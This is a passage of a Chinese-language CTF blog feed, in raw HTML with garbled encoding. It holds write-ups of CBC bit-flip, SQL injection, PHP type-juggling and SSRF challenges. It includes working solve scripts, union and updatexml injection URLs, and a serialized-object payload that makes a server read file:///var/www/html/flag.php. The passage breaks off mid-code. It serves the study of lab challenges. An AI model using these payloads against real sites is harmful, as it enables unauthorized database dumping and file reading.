class="string">";checksum="</span>+checksum</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    token_rcv=raw_input(<span class="string">"token:"</span>)</span><br><span class="line">    <span class="keyword">if</span> token_rcv.split(<span class="string">"admin="</span>)[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">'1'</span> <span class="keyword">and</span> token_rcv.split(<span class="string">"session="</span>)[<span class="number">1</span>][<span class="number">0</span>:<span class="number">16</span>].decode(<span class="string">"hex"</span>)==session:</span><br><span class="line">        c_rcv=token_rcv.split(<span class="string">"checksum="</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        m_rcv=aes_cbc_dec(key,iv,c_rcv)</span><br><span class="line">        <span class="comment"># è®²è§£ç çš„ç»“æœæ‰“å°å‡ºæ¥</span></span><br><span class="line">        <span class="keyword">print</span> m_rcv</span><br><span class="line">        <span class="keyword">if</span> m_rcv.split(<span class="string">"admin="</span>)[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">'1'</span>:</span><br><span class="line">            <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<p>è§£é¢˜è„šæœ¬</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">plain = <span class="string">"session=c3b76cc709a8fddf;admin=0"</span></span><br><span class="line">checksum=<span class="string">"92b612cdfa0abf5a415ab73f7f19826853473d7b02378fc836c6248502390b29"</span></span><br><span class="line"></span><br><span class="line">bit = (ord(checksum.decode(<span class="string">'hex'</span>)[<span class="number">15</span>]) ^ord(<span class="string">'0'</span>) ^ ord(<span class="string">'1'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¯ä¸ª16ä½åŠ å¯†ä¹‹åéƒ½ä¼šå˜æˆ32ä½ï¼Œè¿™é‡Œè¦æ›¿æ¢ç¬¬ä¸€ç»„çš„æœ€åä¸€ä¸ªå­—èŠ‚æ‰€åŠ å¯†åçš„å†…å®¹</span></span><br><span class="line">checksum_final = checksum[:<span class="number">30</span>] + hex(bit)[<span class="number">2</span>:] + checksum[<span class="number">32</span>:]</span><br><span class="line"><span class="keyword">print</span> checksum_final</span><br></pre></td></tr></table></figure>
<p>åœ¨sessioné€šè¿‡ä¹‹åå°±ä¸å†å¯¹sessionè¿›è¡ŒéªŒè¯äº†ï¼Œæ‰€ä»¥å‰16ä½ä¹±ç ä¹Ÿæ²¡æœ‰å…³ç³»ã€‚</p>
<p><img src="https://user-images.githubusercontent.com/40637063/62346910-70f6ff00-b52a-11e9-9827-95e90cbebd1d.png" alt="image"></p>
<h2 id="bugku-login4">bugku login4</h2>
<p>è¿™é“é¢˜ç”±äºè‡ªå·±æ²¡æœ‰è®¤è®¤çœŸçœŸå»åšï¼Œå¯¼è‡´åšå‡ºæ¥èŠ±è´¹äº†å¾ˆå¤šæ—¶é—´ã€‚ç›¸å…³writeupå¦‚ä¸‹ï¼š</p>
<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80684485" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80684485</a></p>
<p><a href="https://www.jianshu.com/p/a61756e54f4f" target="_blank" rel="noopener">https://www.jianshu.com/p/a61756e54f4f</a></p>
<p>è‡ªå·±çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$iv=<span class="string">'4NyZMJ9AOU5JGstqfld10A%3D%3D'</span>;</span><br><span class="line">$cipher=<span class="string">'T3tpIgej42eqA3etE61DRqavWBNrphk4dxENvNgSoYUBiB07C5YKCPwtOUm9pZYINeDrM%2BelzJ3sezJaHufNkA%3D%3D'</span>;</span><br><span class="line"><span class="comment">//username=bdmin password=111</span></span><br><span class="line"></span><br><span class="line">$iv=base64_decode(urldecode($iv));</span><br><span class="line">$cipher=base64_decode(urldecode(($cipher)));</span><br><span class="line"></span><br><span class="line">$source=<span class="keyword">array</span>(<span class="string">'username'</span>=&gt;<span class="string">'bdmin'</span>,<span class="string">'password'</span>=&gt;<span class="string">'111'</span>);</span><br><span class="line">$plain=serialize($source);</span><br><span class="line"></span><br><span class="line">$plain1 = substr($plain,<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">$plain2 = substr($plain,<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">$cipher[<span class="number">9</span>] = chr(ord($cipher[<span class="number">9</span>])^ord(<span class="string">'b'</span>)^ord(<span class="string">'a'</span>));</span><br><span class="line"></span><br><span class="line">$new_iv=<span class="string">''</span>;</span><br><span class="line">$wrong_plain=base64_decode(<span class="string">"U0odmU+LM2Bc4HLVCFql2G1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjExMSI7fQ=="</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">    $new_iv.=chr(ord($wrong_plain[$i])^ord($plain1[$i])^ord($iv[$i]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode($new_iv)).<span class="string">'   '</span>.urlencode(base64_encode($cipher));</span><br></pre></td></tr></table></figure>
<h2 id="å®éªŒå§-ç®€å•çš„ç™»é™†é¢˜">å®éªŒå§ ç®€å•çš„ç™»é™†é¢˜</h2>
<p>çœŸéš¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">denglu</span><span class="params">(payload,idx,c1,c2)</span>:</span></span><br><span class="line">    url=<span class="string">r'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line">    payload = &#123;<span class="string">'id'</span>: payload&#125;</span><br><span class="line">    r = requests.post(url, data=payload)</span><br><span class="line">    Set_Cookie=r.headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line">    iv=re.findall(<span class="string">r"iv=(.*?),"</span>, Set_Cookie)[<span class="number">0</span>]</span><br><span class="line">    cipher=re.findall(<span class="string">r"cipher=(.*)"</span>, Set_Cookie)[<span class="number">0</span>]</span><br><span class="line">    iv_raw = b64decode(urllib.unquote(iv))</span><br><span class="line">    cipher_raw=b64decode(urllib.unquote(cipher))</span><br><span class="line">    lst=list(cipher_raw)</span><br><span class="line">    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">    cipher_new=<span class="string">''</span>.join(lst)</span><br><span class="line">    cipher_new=urllib.quote(b64encode(cipher_new))</span><br><span class="line">    cookie_new=&#123;<span class="string">'iv'</span>: iv,<span class="string">'cipher'</span>:cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    cont=r.content</span><br><span class="line">    plain = re.findall(<span class="string">r"base64_decode\('(.*?)'\)"</span>, cont)[<span class="number">0</span>]</span><br><span class="line">    plain = b64decode(plain)</span><br><span class="line">    first=<span class="string">'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">    iv_new=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">    iv_new = urllib.quote(b64encode(iv_new))</span><br><span class="line">    cookie_new = &#123;<span class="string">'iv'</span>: iv_new, <span class="string">'cipher'</span>: cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    rcont = r.content</span><br><span class="line">    <span class="keyword">print</span> rcont</span><br><span class="line"></span><br><span class="line">denglu(<span class="string">'12'</span>,<span class="number">4</span>,<span class="string">'2'</span>,<span class="string">'#'</span>)</span><br><span class="line">denglu(<span class="string">'0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'</span>+chr(<span class="number">0</span>),<span class="number">6</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">denglu(<span class="string">'0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'</span>+chr(<span class="number">0</span>),<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">denglu(<span class="string">"0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"</span>+chr(<span class="number">0</span>),<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">denglu(<span class="string">"0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);"</span>+chr(<span class="number">0</span>),<span class="number">6</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br></pre></td></tr></table></figure>
<p>è‡ªå·±çš„è„šæœ¬ä¼šå‡ºç°é”™è¯¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line">post=&#123;<span class="string">'id'</span>:<span class="string">"0 2nion select * from((select 1)a join (select 2)b join (select 3)c);"</span>+chr(<span class="number">0</span>)&#125;</span><br><span class="line">responce=requests.post(url,data=post)</span><br><span class="line"></span><br><span class="line">iv=base64.b64decode(urllib.unquote(re.findall(<span class="string">r"iv=(.*?),"</span>,responce.headers[<span class="string">'Set-Cookie'</span>])[<span class="number">0</span>]))</span><br><span class="line">cipher=base64.b64decode(urllib.unquote(re.findall(<span class="string">r"cipher=(.*)"</span>,responce.headers[<span class="string">'Set-Cookie'</span>])[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer</span><span class="params">(cipher,old_iv,offset,old_letter,new_letter)</span>:</span></span><br><span class="line">    cipher=list(cipher)</span><br><span class="line">    cipher[offset]=chr(ord(old_letter)^ord(new_letter)^ord(cipher[offset]))</span><br><span class="line">    cipher=<span class="string">''</span>.join(cipher)</span><br><span class="line">    cookie=&#123;<span class="string">'cipher'</span>:urllib.quote(base64.b64encode(cipher)),<span class="string">'iv'</span>:urllib.quote(base64.b64encode(old_iv))&#125;</span><br><span class="line">    res=requests.post(url,cookies=cookie)</span><br><span class="line">    wrong_plain=base64.b64decode(re.findall(<span class="string">r"base64_decode\('(.*?)'\)"</span>,res.content)[<span class="number">0</span>])</span><br><span class="line">    new_iv = <span class="string">''</span></span><br><span class="line">    right=<span class="string">'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        new_iv+=chr(ord(old_iv[i])^ord(wrong_plain[i])^ord(right[i]))</span><br><span class="line">    cookie=&#123;<span class="string">'cipher'</span>:urllib.quote(base64.b64encode(cipher)),<span class="string">'iv'</span>:urllib.quote(base64.b64encode(new_iv))&#125;</span><br><span class="line">    res=requests.post(url,cookies=cookie)</span><br><span class="line">    <span class="keyword">print</span> res.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">answer(cipher,iv,<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br></pre></td></tr></table></figure>
<p>é”™è¯¯æŠ¥å‘Šå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your</span><br><span class="line">MySQL server version for the right syntax to use near &apos;2)ion select * from((select 1)a</span><br><span class="line">join (select 2)b join (select 3)c);&apos; at line 1</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è¯´æ”¹å˜çš„ä½ç½®å‘ç”Ÿäº†å˜åŒ–ï¼Œä½†æ˜¯å¯¹å¦ä¸€äº›payloadæ¥è¯´å´å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œå¾ˆæ˜¯å¥‡æ€ªï¼Œéš¾é“æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„é—®é¢˜?<br>
æ˜ç™½äº†ï¼Œæ­£åˆ™è¡¨è¾¾å¼æ²¡æœ‰é—®é¢˜ï¼Œæ˜¯è‡ªå·±ä»¥ä¸ºå‰é¢å­—æ®µä¸€æ ·åºåˆ—åŒ–ä¹‹åå‰é¢çš„å­—æ®µä¹Ÿä¼šä¸€æ ·çš„åŸå› å¯¼è‡´ï¼Œå…¶å®æ˜¯ä¸ä¸€æ ·çš„<br>
ä¸€ä¸ªåç§»ä½ç½®ä¸º6ï¼Œä¸€ä¸ªä¸º7ï¼Œè¿™ä¸ªæ­£åˆ™è¦å¥½å¥½çœ‹çœ‹</p>
<h2 id="other">other</h2>
<h3 id="shiyanbar-do-you-really-know-php-plalindrome">shiyanbar do you really know php?(plalindrome)</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = <span class="string">""</span>;</span><br><span class="line">$req = [];</span><br><span class="line">$flag=<span class="string">"xxxxxxxxxx"</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">   header(<span class="string">"hint:6c525af4059b4fe7d8c33a.txt"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>([$_POST] <span class="keyword">as</span> $global_var) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $value = trim($value);</span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123;</span><br><span class="line">    $number = strval($number);</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    $j = strlen($number) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>($i &lt; $j) &#123;</span><br><span class="line">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $i++;</span><br><span class="line">        $j--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//can not input number</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//the number must be int-type</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>])))&#123;</span><br><span class="line"></span><br><span class="line">     $info = <span class="string">"number must be equal to it's integer!! "</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[<span class="string">"number"</span>]);</span><br><span class="line">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));</span><br><span class="line"></span><br><span class="line"><span class="comment">//the number should be plalindrome</span></span><br><span class="line">     <span class="keyword">if</span>($value1!=$value2)&#123;</span><br><span class="line">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//the number should not be plalindrome</span></span><br><span class="line">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</span><br><span class="line">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>;</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $info;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload :2147483647%00</p>
<p>first: as there is %00, is_numeric() will not recognize it as number</p>
<p>second: both strval and intval will ignore %00 and %20</p>
<p>third: after strrev() 2147483647 will turn to 7463847412 , however, intval() can hanle max num of 2147483647,<br>
so intval(7463847412)=2147483647</p>
<p>forth: the number is not plalindrome,so get the flag</p>
]]></content>
  </entry>
  <entry>
    <title>SSRF é¢˜å‹è®°å½•[working forever]</title>
    <url>/2019/06/05/SSRF/</url>
    <content><![CDATA[<h2 id="2019-De1ctf-shellshellshell">2019 De1ctf shellshellshell</h2>
<p>è¿™ä¸ªç½‘ç«™é•¿è¿™æ ·:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/62526250-78404480-b86b-11e9-9e2c-ccab6f04e184.png" alt="QQæˆªå›¾20190806165844"></p>
<p>ç„¶åä»–çš„apiéƒ½æ˜¯</p>
<p>index.php?action=index</p>
<p>index.php?action=publish</p>
<p>index.php?action=logout</p>
<p>ä¹‹ç±»çš„</p>
<p>Source code linking:</p>
<p><a href="http://127.0.0.1:8302/view/" target="_blank" rel="noopener">http://127.0.0.1:8302/view/</a>(many source file)</p>
<p>Guess the existence of <code>user.php</code> and <code>config.php</code>,and try several ways to get access to it .</p>
<p><a href="http://127.0.0.1:8302/user.php~" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php~</a><br>
<a href="http://127.0.0.1:8302/user.php.bak" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php.bak</a><br>
<a href="http://127.0.0.1:8302/user.php.swp" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php.swp</a><br>
<a href="http://127.0.0.1:8302/.user.php~" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php~</a><br>
<a href="http://127.0.0.1:8302/.user.php.bak" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php.bak</a><br>
<a href="http://127.0.0.1:8302/.user.php.swp" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php.swp</a></p>
<p><a href="http://127.0.0.1:8302/config.php~" target="_blank" rel="noopener">http://127.0.0.1:8302/config.php~</a></p>
<p>See exploitment:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signature=1`,`O:4:&quot;Mood&quot;:3:&#123;s:4:&quot;mood&quot;;i:1;s:2:&quot;ip&quot;;s:9:&quot;127.0.0.1&quot;;s:4:&quot;date&quot;;s:1:&quot;0&quot;;&#125;`),(4,`bbb`,(select concat(username,password) from ctf_users where is_admin=1),`O:4:&quot;Mood&quot;:3:&#123;s:4:&quot;mood&quot;;i:1;s:2:&quot;ip&quot;;s:9:&quot;127.0.0.1&quot;;s:4:&quot;date&quot;;s:1:&quot;0&quot;;&#125;`)#&amp;mood=0</span><br></pre></td></tr></table></figure>
<p>check the phpinfo( I made this in docker , here might be some error, anyway):</p>
<p><img src="https://user-images.githubusercontent.com/40637063/62533827-34a10700-b87a-11e9-88d5-60888db5dc73.png" alt="QQæˆªå›¾20190806184325"></p>
<p><a href="https://blog.csdn.net/loongwong2011/article/details/52155046" target="_blank" rel="noopener">simple talk about soap,http,tcp,ip</a></p>
<p><img src="https://user-images.githubusercontent.com/40637063/62526153-44651f00-b86b-11e9-91b2-e210de8fb838.png" alt="QQæˆªå›¾20190806165527"></p>
<h2 id="2018ç½‘é¼æ¯-fakebook">2018ç½‘é¼æ¯ fakebook</h2>
<p><img src="https://user-images.githubusercontent.com/40637063/61576225-e665d700-ab09-11e9-8a70-de85e976bb8c.png" alt="image"></p>
<p>è¿™é‡Œæœ‰ç™»å½•å’Œæ³¨å†ŒåŠŸèƒ½.æ³¨å†Œçš„æ—¶å€™é™¤äº†å¸¸è§„çš„ä¿¡æ¯ä¹‹å¤–è¿˜è®©æˆ‘ä»¬å¡«å†™äº†åšå®¢åœ°å€.å¡«å†™å®Œä¹‹åç™»å½•æ˜¯è¿™æ ·çš„</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576261-583e2080-ab0a-11e9-9736-f2cbc5dc2210.png" alt="image"></p>
<p>ç‚¹è¿›ä¸ªäººé“¾æ¥ä¼šå‘ç°é¡µé¢ä¼šå°è¯•å»è·å–åšå®¢çš„å†…å®¹:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576276-8f143680-ab0a-11e9-826f-ad5c1a505b14.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576271-828fde00-ab0a-11e9-8eaf-ee2787669db0.png" alt="image"></p>
<p>é¦–å…ˆå‘ç°<code>robots.txt</code> ä¸­æœ‰<code>user.php.bak</code>.è®¿é—®è·å¾—æºç .</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å®¹æ˜“çœ‹å‡º,æœåŠ¡ç«¯è¦å»è®¿é—®æˆ‘ä»¬ç»™ä»–ä¼ é€’çš„åšå®¢åœ°å€,è¿™é‡Œæ²¡æœ‰ä»»ä½•é˜²æŠ¤,ä¹Ÿå°±æ˜¯è¯´å­˜åœ¨<code>ssrf</code>æ¼æ´.</p>
<p>é€šè¿‡æ‰«æå’Œç›²çŒœ,å¯ä»¥å‘ç°<code>flag.php</code>çš„å­˜åœ¨.</p>
<p>é‚£ä¹ˆå°±å¯ä»¥è®©æœ¬æ¥åº”è¯¥å»è®¿é—®åšå®¢çš„æœåŠ¡ç«¯å»è®¿é—®ä»–è‡ªå·±çš„<code>flag.php</code>.</p>
<p>å¦å¤–,åœ¨å†…å®¹å±•ç¤ºçš„é¡µé¢å‘ç°äº†ä¸€å¤„æ³¨å…¥(å‚æ•°no):</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576295-fb8f3580-ab0a-11e9-8c28-fd9c6b5277f8.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=-1%20union%20select%201,1,1,1%23</span><br></pre></td></tr></table></figure>
<p>ç»“æœè¢«wafæ£€æµ‹åˆ°äº†,é‚£ä¹ˆå¯ä»¥æŠŠç©ºæ ¼ç”¨æ³¨é‡Šç¬¦å·æ¥æ›¿ä»£:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,1,1,1%23</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/61576335-8e2fd480-ab0b-11e9-9e13-e7952db8439d.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),1)%23</span><br><span class="line"></span><br><span class="line">http://web23.buuoj.cn/view.php?no=1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),&apos;~&apos;),1)%23</span><br></pre></td></tr></table></figure>
<p>ç„¶åé€ä¸ªæŸ¥çœ‹å­—æ®µçš„å†…å®¹,ä¸€ç›´åˆ°dataå­—æ®µ:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(data) from users),&apos;~&apos;),1)%23</span><br></pre></td></tr></table></figure>
<p>å›æ˜¾å¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] query error! (XPATH syntax error: &apos;~O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:&apos;)</span><br></pre></td></tr></table></figure>
<p>ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²â€¦å¯ä»¥æƒ³åˆ°è¿™é‡Œå¯èƒ½æ˜¯å°†dataå­—æ®µè¿›è¡Œååºåˆ—åŒ–ä¹‹ååœ¨é¡µé¢ä¸Šè¿›è¡Œå›æ˜¾.ç”±æ­¤è€Œäº§ç”Ÿçš„payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=-1/**/union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos; #</span><br></pre></td></tr></table></figure>
<p>è€Œå¯¹ç©ºæ ¼çš„wafä¼¼ä¹ä¹Ÿåªæ˜¯é’ˆå¯¹unionè€Œå·².</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576614-ace39a80-ab0e-11e9-9508-2f78be14488a.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61575863-22963900-ab04-11e9-99ee-6f9c76db029d.png" alt="image"></p>
<h2 id="LCTF-2017-ç­¾åˆ°é¢˜">LCTF-2017-ç­¾åˆ°é¢˜</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(!$_GET[&apos;site&apos;])&#123; </span><br><span class="line">	$str = &lt;&lt;&lt;EOD</span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">look source code: </span><br><span class="line">&lt;form action=&apos;&apos; method=&apos;GET&apos;&gt; </span><br><span class="line">&lt;input type=&apos;submit&apos; name=&apos;submit&apos; /&gt; </span><br><span class="line">&lt;input type=&apos;text&apos; name=&apos;site&apos; style=&quot;width:1000px&quot; value=&quot;https://www.baidu.com&quot;/&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">EOD;</span><br><span class="line"></span><br><span class="line">echo $str;</span><br><span class="line">	die(); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;site&apos;]; </span><br><span class="line">$url_schema = parse_url($url); </span><br><span class="line">$host = $url_schema[&apos;host&apos;]; </span><br><span class="line">$request_url = $url.&quot;/&quot;; </span><br><span class="line"></span><br><span class="line">if ($host !== &apos;www.baidu.com&apos;)&#123; </span><br><span class="line">	die(&quot;wrong site&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 